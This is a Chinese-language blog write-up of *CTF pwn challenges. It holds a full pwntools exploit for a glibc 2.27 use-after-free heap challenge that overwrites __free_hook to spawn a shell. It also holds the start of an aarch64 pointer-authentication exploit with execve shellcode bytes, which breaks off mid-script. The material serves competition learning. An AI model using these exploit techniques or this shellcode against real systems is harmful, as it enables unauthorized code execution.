
<!DOCTYPE html>
<html lang="zh-Hans" class="loading">
<head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>六星CTF二进制题解 - V1ct0r的博客</title>
    <meta name="apple-mobile-web-app-capable" content="yes" />
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <meta name="google" content="notranslate" />
    <meta name="keywords" content="TriDiamond Obsidian,"> 
    <meta name="description" content="一、PWN1、babyheap一道2.27的新机制的题目
https://www.anquanke.com/post/id/219292
但是直接改bk指针即可，因为和2.31一样
漏洞点：UAF
,"> 
    <meta name="author" content="V1ct0r"> 
    <link rel="alternative" href="atom.xml" title="V1ct0r的博客" type="application/atom+xml"> 
    <link rel="icon" href="/img/favicon.png"> 
    <link href="https://fonts.loli.net/css?family=Roboto+Mono|Rubik&display=swap" rel="stylesheet">
    
<link rel="stylesheet" href="//at.alicdn.com/t/font_1429596_nzgqgvnmkjb.css">

    
<link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.7.2/animate.min.css">

    
<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/css/share.min.css">

    
<link rel="stylesheet" href="//cdn.bootcss.com/codemirror/5.48.4/codemirror.min.css">

    
<link rel="stylesheet" href="//cdn.bootcss.com/codemirror/5.48.4/theme/dracula.css">

    
<link rel="stylesheet" href="/css/obsidian.css">

    
<link rel="stylesheet" href="/css/ball-atom.min.css">

<meta name="generator" content="Hexo 4.2.1"></head>


<body class="loading">
    <div class="loader">
        <div class="la-ball-atom la-2x">
            <div></div>
            <div></div>
            <div></div>
            <div></div>
        </div>
    </div>
    <span id="config-title" style="display:none">V1ct0r的博客</span>
    <div id="loader"></div>
    <div id="single">
    <div class="scrollbar gradient-bg-rev"></div>
<div id="top" style="display: block;">
    <div class="bar" style="width: 0;"></div>
    <div class="navigation animated fadeIn fast delay-1s">
        <img id="home-icon" class="icon-home" src="/img/favicon.png" alt="" data-url="http://yoursite.com">
        <div id="play-icon" title="Play/Pause" class="iconfont icon-play"></div>
        <h3 class="subtitle">六星CTF二进制题解</h3>
        <div class="social">
            <!--        <div class="like-icon">-->
            <!--            <a href="javascript:;" class="likeThis active"><span class="icon-like"></span><span class="count">76</span></a>-->
            <!--        </div>-->
            <div>
                <div class="share">
                    
                        <a href="javascript:;" class="iconfont icon-share1"></a>
                        <div class="share-component-cc" data-disabled="facebook,douban,linkedin,diandian,tencent,google"></div>
                    
                </div>
            </div>
        </div>
    </div>
</div>

    <div class="section">
        <div class=article-header-wrapper>
    <div class="article-header">
        <div class="article-cover animated fadeIn" style="
            animation-delay: 600ms;
            animation-duration: 1.2s;
            background-image: 
                radial-gradient(ellipse closest-side, rgba(0, 0, 0, 0.65), #100e17),
                url(/img/cover.jpg) ">
        </div>
        <div class="else">
            <p class="animated fadeInDown">
                
                <a href="/categories/PWN&RE"><b>「
                    </b>PWN&RE<b> 」</b></a>
                
                January 20, 2021
            </p>
            <h3 class="post-title animated fadeInDown"><a href="/2021/01/20/*CTF%E4%BA%8C%E8%BF%9B%E5%88%B6%E9%A2%98%E8%A7%A3/" title="六星CTF二进制题解" class="">六星CTF二进制题解</a>
            </h3>
            
            <p class="post-count animated fadeInDown">
                
                <span>
                    <b class="iconfont icon-text2"></b> <i>Words count</i>
                    208k
                </span>
                
                
                <span>
                    <b class="iconfont icon-timer__s"></b> <i>Reading time</i>
                    3:09
                </span>
                
                
                
                <span id="busuanzi_container_page_pv">
                    <b class="iconfont icon-read"></b> <i>Read count</i>
                    <span id="busuanzi_value_page_pv">0</span>
                </span>
                
            </p>
            
            
            <ul class="animated fadeInDown post-tags-list" itemprop="keywords"><li class="animated fadeInDown post-tags-list-item"><a class="animated fadeInDown post-tags-list-link" href="/tags/heap/" rel="tag">heap</a></li><li class="animated fadeInDown post-tags-list-item"><a class="animated fadeInDown post-tags-list-link" href="/tags/tea/" rel="tag">tea</a></li></ul>
            
        </div>
    </div>
</div>

<div class="screen-gradient-after">
    <div class="screen-gradient-content">
        <div class="screen-gradient-content-inside">
            <div class="bold-underline-links screen-gradient-sponsor">
                <p>
                    <span class="animated fadeIn delay-1s"></span>
                </p>
            </div>
        </div>
    </div>
</div>

<div class="article">
    <div class='main'>
        <div class="content markdown animated fadeIn">
            <h3 id="一、PWN"><a href="#一、PWN" class="headerlink" title="一、PWN"></a>一、PWN</h3><h4 id="1、babyheap"><a href="#1、babyheap" class="headerlink" title="1、babyheap"></a>1、babyheap</h4><p>一道2.27的新机制的题目</p>
<p><a href="https://www.anquanke.com/post/id/219292" target="_blank" rel="noopener">https://www.anquanke.com/post/id/219292</a></p>
<p>但是直接改bk指针即可，因为和2.31一样</p>
<p>漏洞点：UAF</p>
<p><img src="/blog_img/image-20210201215448693.png" alt="image-20210201215448693"></p>
<a id="more"></a>

<p>输入点：只能改bk指针，所以需要切割实现overlap通过上一个堆块改下一个堆块的fd指针</p>
<p><img src="/blog_img/image-20210201215431476.png" alt="image-20210201215431476"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># from libformatstr import FormatStr</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context(arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>)</span><br><span class="line"><span class="comment"># context(arch='i386', os='linux')</span></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">elf = ELF(<span class="string">'./pwn'</span>)</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(<span class="string">'./pwn'</span>)</span><br><span class="line">    libc = elf.libc</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">'116.85.48.105'</span>,<span class="number">5005</span>)</span><br><span class="line">    libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="comment">#onegadget64(libc.so.6)  0x45216  0x4526a  0xf02a4  0xf1147</span></span><br><span class="line"><span class="comment">#onegadget32(libc.so.6)  0x3ac5c  0x3ac5e  0x3ac62  0x3ac69  0x5fbc5  0x5fbc6</span></span><br><span class="line"><span class="comment">#onegadget18(libc-2.27.so) 0x4f322  0x4f2c5  0x10a38c</span></span><br><span class="line"><span class="comment"># payload32 = fmtstr_payload(offset ，&#123;xxx_got:system_addr&#125;)</span></span><br><span class="line"><span class="comment"># f = FormatStr(isx64=1)</span></span><br><span class="line"><span class="comment"># f[0x8048260]=0x45372800</span></span><br><span class="line"><span class="comment"># f[0x8048260+4]=0x7f20</span></span><br><span class="line"><span class="comment"># f.payload(7)</span></span><br><span class="line"><span class="comment">#shellcode = asm(shellcraft.sh())</span></span><br><span class="line"><span class="comment">#shellcode32 = '\x68\x01\x01\x01\x01\x81\x34\x24\x2e\x72\x69\x01\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\x6a\x0b\x58\xcd\x80' </span></span><br><span class="line"><span class="comment">#shellcode64 = '\x48\xb8\x01\x01\x01\x01\x01\x01\x01\x01\x50\x48\xb8\x2e\x63\x68\x6f\x2e\x72\x69\x01\x48\x31\x04\x24\x48\x89\xe7\x31\xd2\x31\xf6\x6a\x3b\x58\x0f\x05'</span></span><br><span class="line"><span class="comment">#shellcode64 = '\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05'</span></span><br><span class="line">sl = <span class="keyword">lambda</span> s : p.sendline(s)</span><br><span class="line">sd = <span class="keyword">lambda</span> s : p.send(s)</span><br><span class="line">rc = <span class="keyword">lambda</span> n : p.recv(n)</span><br><span class="line">ru = <span class="keyword">lambda</span> s : p.recvuntil(s)</span><br><span class="line">ti = <span class="keyword">lambda</span> : p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(addr,PIE=True)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> PIE:</span><br><span class="line">        text_base = int(os.popen(<span class="string">"pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'"</span>.format(p.pid)).readlines()[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">        gdb.attach(p,<span class="string">'b *&#123;&#125;'</span>.format(hex(text_base+addr)))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        gdb.attach(p,<span class="string">"b *&#123;&#125;"</span>.format(hex(addr)))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bk</span><span class="params">(addr)</span>:</span></span><br><span class="line">    gdb.attach(p,<span class="string">"b *"</span>+str(hex(addr)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># def mid_overflow(offset,func_got,rdi,rsi,rdx,next_func):</span></span><br><span class="line"><span class="comment"># 	payload = ''</span></span><br><span class="line"><span class="comment"># 	payload += 'a'*offset</span></span><br><span class="line"><span class="comment">#   payload += 'aaaaaaaa'</span></span><br><span class="line"><span class="comment"># 	payload += p64(pppppp_ret)</span></span><br><span class="line"><span class="comment"># 	payload += p64(0)</span></span><br><span class="line"><span class="comment"># 	payload += p64(0)</span></span><br><span class="line"><span class="comment"># 	payload += p64(1)</span></span><br><span class="line"><span class="comment"># 	payload += p64(func_got)</span></span><br><span class="line"><span class="comment"># 	payload += p64(rdx)</span></span><br><span class="line"><span class="comment"># 	payload += p64(rsi)</span></span><br><span class="line"><span class="comment"># 	payload += p64(rdi)</span></span><br><span class="line"><span class="comment"># 	payload += p64(mov_ret)</span></span><br><span class="line"><span class="comment"># 	payload += p64(0)</span></span><br><span class="line"><span class="comment"># 	payload += p64(0)</span></span><br><span class="line"><span class="comment"># 	payload += p64(0)</span></span><br><span class="line"><span class="comment"># 	payload += p64(0)</span></span><br><span class="line"><span class="comment"># 	payload += p64(0)</span></span><br><span class="line"><span class="comment"># 	payload += p64(0)</span></span><br><span class="line"><span class="comment"># 	payload += p64(0)</span></span><br><span class="line"><span class="comment"># 	payload += p64(next_func)</span></span><br><span class="line"><span class="comment"># 	ru('Input:\n')</span></span><br><span class="line"><span class="comment"># 	sd(payload)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(index,size)</span>:</span></span><br><span class="line">    ru(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line">    sl(<span class="string">'1'</span>)</span><br><span class="line">    ru(<span class="string">"input index"</span>)</span><br><span class="line">    sl(str(index))</span><br><span class="line">    ru(<span class="string">"input size"</span>)</span><br><span class="line">    sl(str(size))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">	ru(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line">	sl(<span class="string">'2'</span>)</span><br><span class="line">	ru(<span class="string">"input index"</span>)</span><br><span class="line">	sl(str(index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,content)</span>:</span></span><br><span class="line">    ru(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line">    sl(<span class="string">'3'</span>)</span><br><span class="line">    ru(<span class="string">"input index"</span>)</span><br><span class="line">    sl(str(index))</span><br><span class="line">    ru(<span class="string">"input content"</span>)</span><br><span class="line">    sd(content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">    ru(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line">    sl(<span class="string">'4'</span>)</span><br><span class="line">    ru(<span class="string">"input index"</span>)</span><br><span class="line">    sl(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">malloc_consolidate</span><span class="params">(content)</span>:</span></span><br><span class="line">	ru(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line">	sl(<span class="string">'5'</span>)</span><br><span class="line">	ru(<span class="string">"your name:"</span>)</span><br><span class="line">	sd(content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show2</span><span class="params">()</span>:</span></span><br><span class="line">	ru(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line">	sl(<span class="string">'6'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">15</span>):</span><br><span class="line">	add(i,<span class="number">0x40</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">14</span>):</span><br><span class="line">	free(i)</span><br><span class="line"></span><br><span class="line">malloc_consolidate(<span class="string">"aaaaaaaa"</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x50</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">rc(<span class="number">1</span>)</span><br><span class="line">libc_base = u64(rc(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-0x3ebf00</span>+<span class="number">0x40</span></span><br><span class="line">print(<span class="string">"libc_base---&gt;"</span>+hex(libc_base))</span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">"__free_hook"</span>]</span><br><span class="line">system = libc_base  + libc.sym[<span class="string">"system"</span>]</span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x60</span>)</span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line">edit(<span class="number">8</span>,p64(<span class="number">0x71</span>)+p64(free_hook<span class="number">-8</span>))</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x60</span>)</span><br><span class="line">edit(<span class="number">2</span>,p64(system))</span><br><span class="line">edit(<span class="number">8</span>,p64(<span class="number">0x71</span>)+<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line"><span class="comment"># debug(0x000000000000B57)</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="2、babypac"><a href="#2、babypac" class="headerlink" title="2、babypac"></a>2、babypac</h3><p>这题是ubuntu20下的aarch64的arm题，所以一开始要先strings看清楚版本先，然后ida分析每个地方都有个神奇的签名：这是一种pac机制，一种全新的保护机制，通过在一个内存地址的高位设置一个值，然后当使用到这个内存地址时，要进行check，使用时的值要和设置完的整体值相等，才会真正使用到这个内存地址的值(去掉高位那个标志值)</p>
<p><img src="/blog_img/image-20210203184627251.png" alt="image-20210203184627251">就是这个玩意，ida7.5完美编译出来，也就是说如果我们想要栈溢出，ret地址必须先签名后才能使用。</p>
<p>具体原理学习：</p>
<p><a href="https://www.jianshu.com/p/62bf046b7701" target="_blank" rel="noopener">https://www.jianshu.com/p/62bf046b7701</a></p>
<p><a href="https://juejin.cn/post/6883002562581102600" target="_blank" rel="noopener">https://juejin.cn/post/6883002562581102600</a></p>
<p><a href="https://www.jianshu.com/p/03580e3a1a05" target="_blank" rel="noopener">https://www.jianshu.com/p/03580e3a1a05</a></p>
<p><a href="https://justinyan.me/post/4129" target="_blank" rel="noopener">https://justinyan.me/post/4129</a></p>
<p><a href="https://www.anquanke.com/post/id/171358" target="_blank" rel="noopener">https://www.anquanke.com/post/id/171358</a></p>
<p>现在来看看函数：</p>
<p><img src="/blog_img/image-20210203184911071.png" alt="image-20210203184911071"></p>
<p><img src="/blog_img/image-20210203184840843.png" alt="image-20210203184840843"></p>
<p>漏洞点在lock:</p>
<p><img src="/blog_img/image-20210203184921873.png" alt="image-20210203184921873"></p>
<p>漏洞点数组下标溢出，输入负数，可以达到name的位置：</p>
<p><img src="/blog_img/image-20210203184958235.png" alt="image-20210203184958235"></p>
<p>来看看show函数</p>
<p><img src="/blog_img/image-20210203185028204.png" alt="image-20210203185028204"></p>
<p>可以打印出来我们输入的值以及签名的值(负数溢出)</p>
<p>来看看auth：</p>
<p><img src="/blog_img/image-20210203185209521.png" alt="image-20210203185209521"></p>
<p>先绕过逆向部分的sign，然后有个栈溢出漏洞给我们利用。</p>
<p>往name的地址写入逆向的key和ret地址，我们在lock中利用下标溢出使得他们签名成功，实现利用，完整的exp如下：(封装了ret2rsc的使用)</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># from libformatstr import FormatStr</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="comment"># context.terminal=['tmux','splitw','-h']</span></span><br><span class="line">context(arch=<span class="string">'aarch64'</span>, os=<span class="string">'linux'</span>)</span><br><span class="line"><span class="comment"># context(arch='i386', os='linux')</span></span><br><span class="line">bin_elf = <span class="string">'./chall'</span></span><br><span class="line">context.binary = bin_elf</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>] == <span class="string">"r"</span>:</span><br><span class="line">    p = remote(<span class="string">"106.75.126.171"</span>,<span class="number">33865</span>)</span><br><span class="line"><span class="keyword">elif</span> sys.argv[<span class="number">1</span>] == <span class="string">"l"</span>:</span><br><span class="line">    p = process([<span class="string">"qemu-aarch64"</span>, <span class="string">"-L"</span>, <span class="string">"./"</span>,bin_elf])</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process([<span class="string">"qemu-aarch64"</span>, <span class="string">"-g"</span>, <span class="string">"1234"</span>, <span class="string">"-L"</span>, <span class="string">"./"</span>, bin_elf])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#onegadget64(libc.so.6)</span></span><br><span class="line"><span class="comment">#more onegadget</span></span><br><span class="line"><span class="comment">#one_gadget -l 200 /lib/x86_64-linux-gnu/libc.so.6</span></span><br><span class="line">one64 = [<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf0364</span>,<span class="number">0xf1207</span>]</span><br><span class="line"><span class="comment"># [rax == NULL;[rsp+0x30] == NULL,[rsp+0x50] == NULL,[rsp+0x70] == NULL]</span></span><br><span class="line"><span class="comment">#onegadget32(libc.so.6) </span></span><br><span class="line"><span class="comment"># one32 = [0x3ac5c,0x3ac5e,0x3ac62,0x3ac69,0x5fbc5,0x5fbc6]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># py32 = fmtstr_payload(start_read_offset,&#123;xxx_got:system_addr&#125;)</span></span><br><span class="line"><span class="comment"># sl(py32)</span></span><br><span class="line"><span class="comment"># py64 = FormatStr(isx64=1)</span></span><br><span class="line"><span class="comment"># py64[printf_got] = onegadget</span></span><br><span class="line"><span class="comment"># sl(py64.payload(start_read_offset))</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># shellcode = asm(shellcraft.sh())</span></span><br><span class="line">shellcode32 = <span class="string">'\x68\x01\x01\x01\x01\x81\x34\x24\x2e\x72\x69\x01\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\x6a\x0b\x58\xcd\x80'</span> </span><br><span class="line">shellcode64 = <span class="string">'\x48\xb8\x01\x01\x01\x01\x01\x01\x01\x01\x50\x48\xb8\x2e\x63\x68\x6f\x2e\x72\x69\x01\x48\x31\x04\x24\x48\x89\xe7\x31\xd2\x31\xf6\x6a\x3b\x58\x0f\x05'</span></span><br><span class="line"><span class="comment">#shellcode64 = 